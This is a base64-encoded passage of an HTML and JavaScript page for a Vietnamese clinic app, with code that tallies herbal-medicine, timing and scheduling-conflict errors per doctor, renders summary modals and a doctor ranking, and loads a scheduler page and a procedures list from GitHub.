JvckxvZyBjb2kgbMOgIGzhu5dpIHRo4budaSBnaWFuKQ0KIGZ1bmN0aW9uIGNvdW50VGltZUVycm9ycygpew0KICBjb25zdCBtYXAgPSBuZXcgTWFwKCk7DQoNCiAgLy8gTOG6pXkgdOG7qyBt4bqjbmcgZXJyb3JMb2cgKGtp4buDdSBsZXQgdG/DoG4gY+G7pWMpDQogIGNvbnN0IGxpc3QgPQ0KICAgICh0eXBlb2YgZXJyb3JMb2cgIT09ICd1bmRlZmluZWQnICYmIEFycmF5LmlzQXJyYXkoZXJyb3JMb2cpKSA/IGVycm9yTG9nIDoNCiAgICAoQXJyYXkuaXNBcnJheSh3aW5kb3cuZXJyb3JMb2cpID8gd2luZG93LmVycm9yTG9nIDogW10pOw0KDQogIC8vIENo4buJIGzhuqV5IGzhu5dpIGzhu4djaCB0aOG7nWkgbMaw4bujbmcgKGPDsyBleHBlY3RlZC9hY3R1YWwpDQogIGxpc3QuZm9yRWFjaChlID0+IHsNCiAgICBjb25zdCBkID0gZSAmJiBlLmRldGFpbHM7DQogICAgaWYgKCFkKSByZXR1cm47DQogICAgaWYgKHR5cGVvZiBkLmV4cGVjdGVkID09PSAnbnVtYmVyJyAmJiB0eXBlb2YgZC5hY3R1YWwgPT09ICdudW1iZXInKSB7DQogICAgICBidW1wKG1hcCwgZC5kb2N0b3IsIGQub3BlcmF0b3IpOw0KICAgIH0NCiAgfSk7DQoNCiAgLy8gRmFsbGJhY2s6IMSR4buNYyB0cuG7sWMgdGnhur9wIHThu6sgYuG6o25nIGzhu5dpIHRo4budaSBnaWFuIG7hur91IHbDrCBsw70gZG8gbsOgbyDEkcOzIG3huqNuZyBy4buXbmcNCiAgaWYgKG1hcC5zaXplID09PSAwKSB7DQogICAgZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnI2Vycm9yTG9nIHRyLmVycm9yLXJvdycpLmZvckVhY2godHIgPT4gew0KICAgICAgY29uc3QgdGRzID0gdHIucXVlcnlTZWxlY3RvckFsbCgndGQnKTsNCiAgICAgIC8vIELhuqNuZyBjw7MgY+G7mXQ6IFTDqm4gQk4gfCBUaOG7pyB0aHXhuq10IHwgQsOhYyBz4bu5IGNo4buJIMSR4buLbmggfCBOZ8aw4budaSB0aOG7sWMgaGnhu4duIHwgVGjhu51pIGdpYW4gfCBM4buXaQ0KICAgICAgY29uc3QgZG9jdG9yICAgPSB0ZHNbMl0/LnRleHRDb250ZW50Py50cmltKCk7DQogICAgICBjb25zdCBvcGVyYXRvciA9IHRkc1szXT8udGV4dENvbnRlbnQ/LnRyaW0oKTsNCiAgICAgIGlmIChkb2N0b3IgfHwgb3BlcmF0b3IpIGJ1bXAobWFwLCBkb2N0b3IsIG9wZXJhdG9yKTsNCiAgICB9KTsNCiAgfQ0KDQogIHJldHVybiBtYXA7DQp9DQoNCiAgLy8gMykgxJDhur9tIFRSw5lORyBHSeG7nCAodOG7qyBhbGxQcm9jZWR1cmVzLmNvbmZsaWN0PXRydWUpDQpmdW5jdGlvbiBjb3VudENvbmZsaWN0cygpew0KICBjb25zdCBsaXN0ID0NCiAgICAodHlwZW9mIGFsbFByb2NlZHVyZXMgIT09ICd1bmRlZmluZWQnICYmIEFycmF5LmlzQXJyYXkoYWxsUHJvY2VkdXJlcykpID8gYWxsUHJvY2VkdXJlcyA6DQogICAgKEFycmF5LmlzQXJyYXkod2luZG93LmFsbFByb2NlZHVyZXMpID8gd2luZG93LmFsbFByb2NlZHVyZXMgOiBbXSk7DQogIGNvbnN0IG1hcCA9IG5ldyBNYXAoKTsNCiAgbGlzdC5mb3JFYWNoKHAgPT4gew0KICAgIGlmIChwICYmIHAuY29uZmxpY3QpIGJ1bXAobWFwLCBwLmRvY3RvciwgcC5vcGVyYXRvcik7DQogIH0pOw0KICByZXR1cm4gbWFwOw0KfQ0KZnVuY3Rpb24gYnVpbGREb2N0b3JSYW5raW5nKGhlcmJNYXAsIHRpbWVNYXAsIGNvbmZNYXApew0KICBjb25zdCB0b3RhbE1hcCA9IG5ldyBNYXAoKTsNCg0KICAvLyBn4buZcCBz4buRIHThu6sgMyBtYXANCiAgY29uc3QgbWVyZ2UgPSAoc3JjKSA9PiB7DQogICAgc3JjLmZvckVhY2goKGluZm8sIGRvYyk9PnsNCiAgICAgIGlmKCF0b3RhbE1hcC5oYXMoZG9jKSkgdG90YWxNYXAuc2V0KGRvYyx7dG90YWw6MH0pOw0KICAgICAgdG90YWxNYXAuZ2V0KGRvYykudG90YWwgKz0gaW5mby50b3RhbDsNCiAgICB9KTsNCiAgfTsNCiAgbWVyZ2UoaGVyYk1hcCk7IG1lcmdlKHRpbWVNYXApOyBtZXJnZShjb25mTWFwKTsNCg0KICAvLyBzb3J0IGdp4bqjbSBk4bqnbg0KICBjb25zdCBhcnIgPSBBcnJheS5mcm9tKHRvdGFsTWFwLmVudHJpZXMoKSkuc29ydCgoYSxiKT0+YlsxXS50b3RhbCAtIGFbMV0udG90YWwpOw0KDQogIGxldCBodG1sID0gYDxkaXYgY2xhc3M9InNlY3Rpb24iPjxkaXYgY2xhc3M9ImlubmVyIj5gOw0KICBpZihhcnIubGVuZ3RoPT09MCl7DQogICAgaHRtbCArPSBgPGRpdiBjbGFzcz0ibm90ZS1lbXB0eSI+Q2jGsGEgY8OzIGThu68gbGnhu4d1PC9kaXY+YDsNCiAgfSBlbHNlIHsNCiAgICBodG1sICs9IGA8dGFibGUgY2xhc3M9InRhYmxlLWNsZWFuIj48dGhlYWQ+PHRyPg0KICAgICAgICAgICAgICA8dGg+SOG6oW5nPC90aD48dGg+QsOhYyBzxKk8L3RoPg0KICAgICAgICAgICAgICA8dGggY2xhc3M9InJpZ2h0Ij5U4buVbmcgbOG7l2k8L3RoPg0KICAgICAgICAgICAgPC90cj48L3RoZWFkPjx0Ym9keT5gOw0KICAgIGFyci5mb3JFYWNoKChbZG9jLGluZm9dLGkpPT57DQogICAgICBodG1sICs9IGA8dHI+DQogICAgICAgIDx0ZD4ke2krMX08L3RkPg0KICAgICAgICA8dGQ+PGI+JHtkb2N9PC9iPjwvdGQ+DQogICAgICAgIDx0ZCBjbGFzcz0icmlnaHQiPiR7aW5mby50b3RhbH08L3RkPg0KICAgICAgPC90cj5gOw0KICAgIH0pOw0KICAgIGh0bWwgKz0gYDwvdGJvZHk+PC90YWJsZT5gOw0KICB9DQogIGh0bWwgKz0gYDwvZGl2PjwvZGl2PmA7DQogIHJldHVybiBodG1sOw0KfQ0KICAvLyBSZW5kZXIgMSBzZWN0aW9uDQpmdW5jdGlvbiByZW5kZXJTZWN0aW9uKHRpdGxlLCBtYXAsIHNob3dPcGVyYXRvcnMgPSB0cnVlKXsNCiAgaWYoIW1hcCB8fCBtYXAuc2l6ZT09PTApew0KICAgIHJldHVybiBgPGg0IHN0eWxlPSJtYXJnaW46MTBweCAwIDZweCI+JHt0aXRsZX08L2g0PjxkaXY+PGk+Q2jGsGEgY8OzIGThu68gbGnhu4d1PC9pPjwvZGl2PmA7DQogIH0NCiAgY29uc3QgZG9jdG9ycyA9IEFycmF5LmZyb20obWFwLmVudHJpZXMoKSkuc29ydCgoYSxiKT0+YlsxXS50b3RhbCAtIGFbMV0udG90YWwpOw0KDQogIGxldCBodG1sID0gYDxoNCBzdHlsZT0ibWFyZ2luOjEwcHggMCA2cHgiPiR7dGl0bGV9PC9oND48ZGl2IHN0eWxlPSJib3JkZXI6MXB4IHNvbGlkICNlZWU7Ym9yZGVyLXJhZGl1czo4cHg7cGFkZGluZzoxMnB4Ij5gOw0KICBkb2N0b3JzLmZvckVhY2goKFtkb2N0b3IsIGluZm9dKT0+ew0KICAgIGh0bWwgKz0gYDxkaXYgc3R5bGU9Im1hcmdpbi1ib3R0b206MTBweCI+DQogICAgICA8ZGl2PkLDoWMgc8SpIDxiPiR7ZG9jdG9yfTo8L2I+ICR7aW5mby50b3RhbH08L2Rpdj5gOw0KICAgIGlmIChzaG93T3BlcmF0b3JzKXsNCiAgICAgIGNvbnN0IG9wcyA9IEFycmF5LmZyb20oaW5mby5ieU9wZXJhdG9yLmVudHJpZXMoKSkuc29ydCgoYSxiKT0+YlsxXS1hWzFdKTsNCiAgICAgIGlmKG9wcy5sZW5ndGgpew0KICAgICAgICBodG1sICs9IGA8ZGl2IHN0eWxlPSJtYXJnaW4tbGVmdDoxMnB4O21hcmdpbi10b3A6NHB4Ij5gICsNCiAgICAgICAgICAgICAgICBvcHMubWFwKChbb3AsY10pID0+IGAtICR7b3B9OiAke2N9YCkuam9pbignPGJyPicpICsNCiAgICAgICAgICAgICAgICBgPC9kaXY+YDsNCiAgICAgIH0NCiAgICB9DQogICAgaHRtbCArPSBgPC9kaXY+YDsNCiAgfSk7DQogIGh0bWwgKz0gYDwvZGl2PmA7DQogIHJldHVybiBodG1sOw0KfQ0KDQogIGZ1bmN0aW9uIGJ1aWxkU3VtbWFyeUhUTUwoKXsNCiAgICBjb25zdCBoZXJiTWFwID0gY291bnRIZXJiKCk7DQogICAgY29uc3QgdGltZU1hcCA9IGNvdW50VGltZUVycm9ycygpOw0KICAgIGNvbnN0IGNvbmZNYXAgPSBjb3VudENvbmZsaWN0cygpOw0KDQogICAgLy8gVOG7lW5nIG5oYW5oIChkw7JuZyDEkeG6p3UpDQogICAgY29uc3QgaGVyYlRvdGFsID0gQXJyYXkuZnJvbShoZXJiTWFwLnZhbHVlcygpKS5yZWR1Y2UoKHMsYik9PnMrYi50b3RhbCwwKTsNCiAgICBjb25zdCB0aW1lVG90YWwgPSBBcnJheS5mcm9tKHRpbWVNYXAudmFsdWVzKCkpLnJlZHVjZSgocyxiKT0+cytiLnRvdGFsLDApOw0KICAgIGNvbnN0IGNvbmZUb3RhbCA9IEFycmF5LmZyb20oY29uZk1hcC52YWx1ZXMoKSkucmVkdWNlKChzLGIpPT5zK2IudG90YWwsMCk7DQoNCiAgICBsZXQgdG9wID0gYCA8ZGl2IGNsYXNzPSJzdW1tYXJ5LXdyYXAiPg0KICAgICAgPGRpdiBjbGFzcz0ia3BpLWdyaWQiPg0KICAgICAgICA8ZGl2IGNsYXNzPSJrcGktY2FyZCBrcGktYmx1ZSI+DQogICAgICAgICAgPGRpdiBjbGFzcz0ia3BpLXRpdGxlIj48aSBjbGFzcz0iZmEtc29saWQgZmEtbW9ydGFyLXBlc3RsZSI+PC9pPiBT4bqvYyB0aHXhu5FjIHRoYW5nPC9kaXY+DQogICAgICAgICAgPGRpdiBjbGFzcz0ia3BpLXZhbHVlIj4ke2hlcmJUb3RhbH08L2Rpdj4NCiAgICAgICAgPC9kaXY+DQogICAgICAgIDxkaXYgY2xhc3M9ImtwaS1jYXJkIGtwaS1hbWJlciI+DQogICAgICAgICAgPGRpdiBjbGFzcz0ia3BpLXRpdGxlIj48aSBjbGFzcz0iZmEtcmVndWxhciBmYS1jbG9jayI+PC9pPiBTYWkgdGjhu51pIGdpYW48L2Rpdj4NCiAgICAgICAgICA8ZGl2IGNsYXNzPSJrcGktdmFsdWUiPiR7dGltZVRvdGFsfTwvZGl2Pg0KICAgICAgICA8L2Rpdj4NCiAgICAgICAgPGRpdiBjbGFzcz0ia3BpLWNhcmQga3BpLXJlZCI+DQogICAgICAgICAgPGRpdiBjbGFzcz0ia3BpLXRpdGxlIj48aSBjbGFzcz0iZmEtc29saWQgZmEtdHJpYW5nbGUtZXhjbGFtYXRpb24iPjwvaT4gVHLDuW5nIGdp4budPC9kaXY+DQogICAgICAgICAgPGRpdiBjbGFzcz0ia3BpLXZhbHVlIj4ke2NvbmZUb3RhbH08L2Rpdj4NCiAgICAgICAgPC9kaXY+DQogICAgICA8L2Rpdj5gOw0KDQogICAgcmV0dXJuIHRvcA0KICAgICAgKyByZW5kZXJTZWN0aW9uKCdT4bqvYyB0aHXhu5FjIHRoYW5nJywgaGVyYk1hcCwgLypzaG93T3BlcmF0b3JzKi8gZmFsc2UpIA0KICAgICAgKyAnPGJyLz4nDQogICAgICArIHJlbmRlclNlY3Rpb24oJ1NhaSB0aOG7nWkgZ2lhbicsIHRpbWVNYXApDQogICAgICArICc8YnIvPicNCiAgICAgICsgcmVuZGVyU2VjdGlvbignVHLDuW5nIGdp4budJywgY29uZk1hcCk7DQogIH0NCg0KICAvLyBN4bufL8SRw7NuZyBtb2RhbA0KICB3aW5kb3cub3BlbkVycm9yU3VtbWFyeSA9IGZ1bmN0aW9uKCl7DQogICAgY29uc3QgbW9kYWwgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc3VtbWFyeU1vZGFsJyk7DQogICAgY29uc3QgY29udGVudCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzdW1tYXJ5Q29udGVudCcpOw0KICAgIGlmKCFtb2RhbCB8fCAhY29udGVudCkgcmV0dXJuOw0KLy8gbOG6pXkgMyBtYXAgxJHhu4MgdHJ1eeG7gW4gY2hvIGLhuqNuZyB44bq/cCBo4bqhbmcNCmNvbnN0IGhlcmJNYXAgPSBjb3VudEhlcmIoKTsNCmNvbnN0IHRpbWVNYXAgPSBjb3VudFRpbWVFcnJvcnMoKTsNCmNvbnN0IGNvbmZNYXAgPSBjb3VudENvbmZsaWN0cygpOw0KDQovLyBu4buZaSBkdW5nIHBvcHVwID0gcGjhuqduIHTDs20gdOG6r3QgY8WpICsgYuG6o25nIHjhur9wIGjhuqFuZyBiw6FjIHPEqQ0KY29udGVudC5pbm5lckhUTUwgPSBidWlsZFN1bW1hcnlIVE1MKCkNCiAgKyBidWlsZERvY3RvclJhbmtpbmcoaGVyYk1hcCwgdGltZU1hcCwgY29uZk1hcCk7DQogICAgbW9kYWwuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQogIH07DQogIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzdW1tYXJ5Q2xvc2VCdG4nKT8uYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCAoKT0+IHsNCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc3VtbWFyeU1vZGFsJykuc3R5bGUuZGlzcGxheT0nbm9uZSc7DQogIH0pOw0KICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc3VtbWFyeUJhY2tkcm9wJyk/LmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgKCk9PiB7DQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3N1bW1hcnlNb2RhbCcpLnN0eWxlLmRpc3BsYXk9J25vbmUnOw0KICB9KTsNCg0KICAvLyBTYXUga2hpIOKAnEtp4buDbSBUcmHigJ0geG9uZywgaGnhu4duIG7DunQgVMOzbSBU4bqvdCBM4buXaSAodGhlbyBjw7luZyBjxqEgY2jhur8gbmjGsCAyIG7DunQga2lhKQ0KICAvLyAoxJDDoyBjw7MgbG9naWMgaGnhu4duIG7DunQgdHJvbmcgc2V0VGltZW91dCBzYXUgYW5hbHl6ZSDigJQgdGEgY2jhu4kgxJHhuqNtIGLhuqNvIG7DunQgbsOgeSBjxaluZyBoaeG7h24pDQogIGNvbnN0IG9yaWcgPSBzZXRUaW1lb3V0Ow0KICAvLyBLaMO0bmcgY+G6p24gaG9vaywgdsOsIGNvZGUgY8OzIMSRb+G6oW46DQogIC8vIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJ2J1dHRvbi5idG4nKS5mb3JFYWNoKGJ0biA9PiB7DQogIC8vICAgaWYgKGJ0bi50ZXh0Q29udGVudC5pbmNsdWRlcygnR2nhu50gdHLhu5FuZycpIHx8IGJ0bi50ZXh0Q29udGVudC5pbmNsdWRlcygnU+G6r2MgdGh14buRYyB0aGFuZycpKSB7IGJ0bi5zdHlsZS5kaXNwbGF5PSdpbmxpbmUtYmxvY2snO30NCiAgLy8gfSk7DQogIC8vIC0+IFRhIHRow6ptIGTDsm5nIGTGsOG7m2kgxJHhu4MgbsO6dCBt4bubaSBjxaluZyDEkcaw4bujYyBi4bqtdDoNCiAgZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcignRE9NQ29udGVudExvYWRlZCcsICgpID0+IHsNCiAgICAvLyBLaGkgcG9wdXAgbG9hZGluZyB04bqvdCBzYXUgYW5hbHl6ZSwgdGEgYuG6rXQgdGjhu6cgY8O0bmcgbuG6v3UgxJHDoyBjw7MgZOG7ryBsaeG7h3U6DQogICAgLy8gKGFuIHRvw6BuIG7hur91IGfhu41pIG5oaeG7gXUgbOG6p24pDQogICAgY29uc3Qgc2hvd0lmRGF0YSA9ICgpID0+IHsNCiAgICAgIGlmIChBcnJheS5pc0FycmF5KHdpbmRvdy5hbGxQcm9jZWR1cmVzKSAmJiB3aW5kb3cuYWxsUHJvY2VkdXJlcy5sZW5ndGgpew0KICAgICAgICBjb25zdCBiID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Vycm9yU3VtbWFyeUJ0bicpOw0KICAgICAgICBpZiAoYikgYi5zdHlsZS5kaXNwbGF5ID0gJ2lubGluZS1ibG9jayc7DQogICAgICB9DQogICAgfTsNCiAgICAvLyBjaOG6oXkgbmdheSB2w6Agc2F1IG3hu5dpIGzhuqduIGzhu41jL3JlbmRlcg0KICAgIHNob3dJZkRhdGEoKTsNCiAgICAvLyBn4bqvbiB2w6BvIGPDoWMgxJFp4buDbSDEkcOjIGPDszoNCiAgICBjb25zdCByYiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdyZXN1bHRCb2R5Jyk7DQogICAgY29uc3QgZWwgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZXJyb3JMb2cnKTsNCiAgICBjb25zdCBvYnMgPSBuZXcgTXV0YXRpb25PYnNlcnZlcihzaG93SWZEYXRhKTsNCiAgICBpZiAocmIpIG9icy5vYnNlcnZlKHJiLCB7Y2hpbGRMaXN0OnRydWUsc3VidHJlZTp0cnVlfSk7DQogICAgaWYgKGVsKSBvYnMub2JzZXJ2ZShlbCwge2NoaWxkTGlzdDp0cnVlLHN1YnRyZWU6dHJ1ZX0pOw0KICB9KTsNCn0pKCk7DQo8L3NjcmlwdD4NCg0KPHNjcmlwdD4NCmRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoJ0RPTUNvbnRlbnRMb2FkZWQnLCAoKSA9PiB7DQogIGNvbnN0IGJ0biA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdlcnJvclN1bW1hcnlCdG4nKTsNCiAgY29uc3QgaGVyYkJ0biA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdoZXJiVG9nZ2xlQnRuJyk7DQogIGNvbnN0IGF2YWlsQnRuID0gZG9jdW1lbnQucXVlcnlTZWxlY3RvcignYnV0dG9uLmJ0bltvbmNsaWNrPSJ0b2dnbGVBdmFpbGFiaWxpdHkoKSJdJyk7DQoNCiAgZnVuY3Rpb24gc3luY1Nob3coKXsNCiAgICBpZiAoIWJ0bikgcmV0dXJuOw0KICAgIGNvbnN0IGhlcmJTaG93biAgPSBoZXJiQnRuICYmIGdldENvbXB1dGVkU3R5bGUoaGVyYkJ0bikuZGlzcGxheSAhPT0gJ25vbmUnOw0KICAgIGNvbnN0IGF2YWlsU2hvd24gPSBhdmFpbEJ0biAmJiBnZXRDb21wdXRlZFN0eWxlKGF2YWlsQnRuKS5kaXNwbGF5ICE9PSAnbm9uZSc7DQogICAgaWYgKGhlcmJTaG93biB8fCBhdmFpbFNob3duKSBidG4uc3R5bGUuZGlzcGxheSA9ICdpbmxpbmUtYmxvY2snOw0KICB9DQoNCiAgLy8gY2jhuqF5IG5nYXkgdsOgIGtoaSBjw7MgdGhheSDEkeG7lWkgaGnhu4NuIHRo4buLDQogIHN5bmNTaG93KCk7DQogIG5ldyBNdXRhdGlvbk9ic2VydmVyKHN5bmNTaG93KS5vYnNlcnZlKGRvY3VtZW50LmJvZHksIHsNCiAgICBhdHRyaWJ1dGVzOiB0cnVlLCBzdWJ0cmVlOiB0cnVlLCBhdHRyaWJ1dGVGaWx0ZXI6IFsnc3R5bGUnLCdjbGFzcyddDQogIH0pOw0KfSk7DQoNCg0KPC9zY3JpcHQ+DQo8IS0tIE1vZGFsIEZyYW1lOiBU4bqhbyBnaeG7nSB0aOG7pyB0aHXhuq10IC0tPg0KPGRpdiBpZD0icHJvY2VkdXJlRnJhbWVNb2RhbCIgc3R5bGU9ImRpc3BsYXk6bm9uZTtwb3NpdGlvbjpmaXhlZDtpbnNldDowO3otaW5kZXg6MTEwNzA7Ij4NCiAgPGRpdiBzdHlsZT0icG9zaXRpb246YWJzb2x1dGU7aW5zZXQ6MDtiYWNrZ3JvdW5kOnJnYmEoMCwwLDAsMC41KSIgb25jbGljaz0iY2xvc2VQcm9jZWR1cmVTY2hlZHVsZXIoKSI+PC9kaXY+DQogIDxkaXYgc3R5bGU9Ig0KICAgICAgcG9zaXRpb246YWJzb2x1dGU7dG9wOjQlO2xlZnQ6NTAlO3RyYW5zZm9ybTp0cmFuc2xhdGVYKC01MCUpOw0KICAgICAgd2lkdGg6bWluKDEyMDBweCw5NnZ3KTtoZWlnaHQ6OTB2aDsNCiAgICAgIGJhY2tncm91bmQ6I2ZmZjtjb2xvcjojMDAwO2JvcmRlci1yYWRpdXM6MTBweDtib3JkZXI6MnB4IHNvbGlkICMzNDk4ZGI7DQogICAgICBib3gtc2hhZG93OjAgOHB4IDI0cHggcmdiYSgwLDAsMCwuMjUpO2Rpc3BsYXk6ZmxleDtmbGV4LWRpcmVjdGlvbjpjb2x1bW4iPg0KICAgIDxkaXYgc3R5bGU9ImRpc3BsYXk6ZmxleDthbGlnbi1pdGVtczpjZW50ZXI7anVzdGlmeS1jb250ZW50OnNwYWNlLWJldHdlZW47cGFkZGluZzoxMHB4IDEycHg7Ym9yZGVyLWJvdHRvbToxcHggc29saWQgI2U1ZTdlYiI+DQogICAgICA8c3Ryb25nPlThuqFvIGdp4budIHRo4bunIHRodeG6rXQ8L3N0cm9uZz4NCiAgICAgIDxkaXYgc3R5bGU9ImRpc3BsYXk6ZmxleDtnYXA6NnB4Ij4NCiAgICAgICAgPGJ1dHRvbiBjbGFzcz0iYnRuIiBvbmNsaWNrPSJyZWxvYWRQcm9jZWR1cmVTY2hlZHVsZXIoKSJzdHlsZT0icGFkZGluZzo4cHggMTRweDtmb250LXNpemU6MTNweDtib3JkZXItcmFkaXVzOjRweDsiPkzDoG0gbeG7m2k8L2J1dHRvbj4NCiAgICAgICAgPGJ1dHRvbiBjbGFzcz0iYnRuIiBvbmNsaWNrPSJjbG9zZVByb2NlZHVyZVNjaGVkdWxlcigpInN0eWxlPSJwYWRkaW5nOjhweCAxNHB4O2ZvbnQtc2l6ZToxM3B4O2JvcmRlci1yYWRpdXM6NHB4OyI+xJDDs25nPC9idXR0b24+DQogICAgICA8L2Rpdj4NCiAgICA8L2Rpdj4NCiAgICA8aWZyYW1lIGlkPSJwcm9jZWR1cmVGcmFtZSIgc3JjPSJhYm91dDpibGFuayIgc3R5bGU9ImZsZXg6MTt3aWR0aDoxMDAlO2JvcmRlcjowIiBhbGxvd2Z1bGxzY3JlZW4+PC9pZnJhbWU+DQogIDwvZGl2Pg0KPC9kaXY+PHNjcmlwdD4NCiAgZnVuY3Rpb24gb3BlblByb2NlZHVyZVNjaGVkdWxlcigpIHsNCiAgICBjb25zdCBtb2RhbCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwcm9jZWR1cmVGcmFtZU1vZGFsJyk7DQogICAgY29uc3QgZnJhbWUgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncHJvY2VkdXJlRnJhbWUnKTsNCiAgICBmcmFtZS5zcmMgPSAnaHR0cHM6Ly9jaGF1aHV5bmgwMTA0LmdpdGh1Yi5pby9neW0vbHR0Lmh0bWwnOw0KICAgIG1vZGFsLnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KICB9DQogIGZ1bmN0aW9uIHJlbG9hZFByb2NlZHVyZVNjaGVkdWxlcigpIHsNCiAgICBjb25zdCBmcmFtZSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwcm9jZWR1cmVGcmFtZScpOw0KICAgIGlmIChmcmFtZSAmJiBmcmFtZS5jb250ZW50V2luZG93KSB7DQogICAgICB0cnkgeyBmcmFtZS5jb250ZW50V2luZG93LmxvY2F0aW9uLnJlbG9hZCgpOyB9DQogICAgICBjYXRjaCAoXykgeyBmcmFtZS5zcmMgPSBmcmFtZS5zcmM7IH0NCiAgICB9DQogIH0NCiAgZnVuY3Rpb24gY2xvc2VQcm9jZWR1cmVTY2hlZHVsZXIoKSB7DQogICAgY29uc3QgbW9kYWwgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncHJvY2VkdXJlRnJhbWVNb2RhbCcpOw0KICAgIGNvbnN0IGZyYW1lID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Byb2NlZHVyZUZyYW1lJyk7DQogICAgZnJhbWUuc3JjID0gJ2Fib3V0OmJsYW5rJzsNCiAgICBtb2RhbC5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw0KICB9DQo8L3NjcmlwdD4NCg0KPCEtLSBQT1BVUCBUVeG7siBCSeG6vk4gVEjhu6YgVEhV4bqsVCAtLT4NCjxkaXYgaWQ9ImN1c3RvbWl6ZU1vZGFsIiBzdHlsZT0iZGlzcGxheTpub25lO3Bvc2l0aW9uOmZpeGVkO2luc2V0OjA7ei1pbmRleDoxMTA2MDsiPg0KICA8ZGl2IHN0eWxlPSJwb3NpdGlvbjphYnNvbHV0ZTtpbnNldDowO2JhY2tncm91bmQ6cmdiYSgwLDAsMCwwLjUpIiBvbmNsaWNrPSJjbG9zZUN1c3RvbWl6ZVBhbmVsKCkiPjwvZGl2Pg0KICA8ZGl2IHN0eWxlPSINCiAgICAgIHBvc2l0aW9uOmFic29sdXRlO3RvcDo4JTtsZWZ0OjUwJTt0cmFuc2Zvcm06dHJhbnNsYXRlWCgtNTAlKTsNCiAgICAgIHdpZHRoOm1pbig4MjBweCw5MnZ3KTttYXgtaGVpZ2h0Ojg0dmg7b3ZlcmZsb3c6YXV0bzsNCiAgICAgIGJhY2tncm91bmQ6I2ZmZjtjb2xvcjojMDAwO2JvcmRlci1yYWRpdXM6MTBweDtib3JkZXI6MnB4IHNvbGlkICMzNDk4ZGI7DQogICAgICBib3gtc2hhZG93OjAgOHB4IDI0cHggcmdiYSgwLDAsMCwuMjUpO2ZvbnQtZmFtaWx5OkludGVyLHNhbnMtc2VyaWYiPg0KICA8ZGl2IHN0eWxlPSJkaXNwbGF5OmZsZXg7YWxpZ24taXRlbXM6Y2VudGVyO2p1c3RpZnktY29udGVudDpzcGFjZS1iZXR3ZWVuOw0KICAgICAgICAgICAgcGFkZGluZzoxNHB4IDE2cHg7Ym9yZGVyLWJvdHRvbToxcHggc29saWQgI2U1ZTdlYiI+DQogIDxoMyBzdHlsZT0ibWFyZ2luOjA7Zm9udC1zaXplOjE4cHgiPkLhuqNuZyBUdeG7syBiaeG6v24gVGjhu6cgdGh14bqtdDwvaDM+DQogIDxkaXYgc3R5bGU9ImRpc3BsYXk6ZmxleDthbGlnbi1pdGVtczpjZW50ZXI7anVzdGlmeS1jb250ZW50OmZsZXgtZW5kO2dhcDo2cHg7Ij4NCiAgPGJ1dHRvbiBjbGFzcz0iYnRuIiBvbmNsaWNrPSJzaG93Tm9QZXJtaXNzaW9uKCkiDQogICAgICAgICAgc3R5bGU9InBhZGRpbmc6OHB4IDE0cHg7Zm9udC1zaXplOjEzcHg7Ym9yZGVyLXJhZGl1czo0cHg7Ij4NCiAgICBUaMOqbQ0KICA8L2J1dHRvbj4NCiAgPGJ1dHRvbiBjbGFzcz0iYnRuIiBvbmNsaWNrPSJjbG9zZUN1c3RvbWl6ZVBhbmVsKCkiDQogICAgICAgICAgc3R5bGU9InBhZGRpbmc6OHB4IDE0cHg7Zm9udC1zaXplOjEzcHg7Ym9yZGVyLXJhZGl1czo0cHg7Ij4NCiAgICDEkMOzbmcNCiAgPC9idXR0b24+DQo8L2Rpdj4NCjwvZGl2Pg0KICAgIDxkaXYgc3R5bGU9InBhZGRpbmc6MHB4IDE2cHgiPg0KICAgIA0KICAgICAgPHRhYmxlIGNsYXNzPSJlcnJvci10YWJsZSIgc3R5bGU9IndpZHRoOjEwMCUiPg0KICAgICAgICA8dGhlYWQ+DQogICAgICAgICAgPHRyPg0KICAgICAgICAgICAgPHRoIHN0eWxlPSJ3aWR0aDo2MHB4Ij5TVFQ8L3RoPg0KICAgICAgICAgICAgPHRoPlRo4bunIFRodeG6rXQ8L3RoPg0KICAgICAgICAgICAgPHRoIHN0eWxlPSJ3aWR0aDoxMzBweCI+VGjhu51pIGdpYW48L3RoPg0KICAgICAgICAgICAgPHRoIHN0eWxlPSJ3aWR0aDoxMTBweCI+Q2h14bqpbiBi4buLPC90aD4NCiAgICAgICAgICA8L3RyPg0KICAgICAgICA8L3RoZWFkPg0KICAgICAgICA8dGJvZHkgaWQ9ImN1c3RvbWl6ZUJvZHkiPjwvdGJvZHk+DQogICAgICA8L3RhYmxlPg0KICANCiAgPC9kaXY+DQo8L2Rpdj4NCjxzY3JpcHQ+DQogIGNvbnN0IFRIVVRIVUFUX1VSTCA9ICdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vY2hhdWh1eW5oMDEwNC9jaGF1aHV5bmgwMTA0LnR4dC9yZWZzL2hlYWRzL21haW4vY2hhdV90aHV0aHVhdC50eHQnOw0KDQogIGFzeW5jIGZ1bmN0aW9uIG9wZW5DdXN0b21pemVQYW5lbCgpIHsNCiAgICB0cnkgew0KICAgICAgaWYgKCF3aW5kb3cuUFJPQ0VEVVJFUyB8fCBPYmplY3Qua2V5cyh3aW5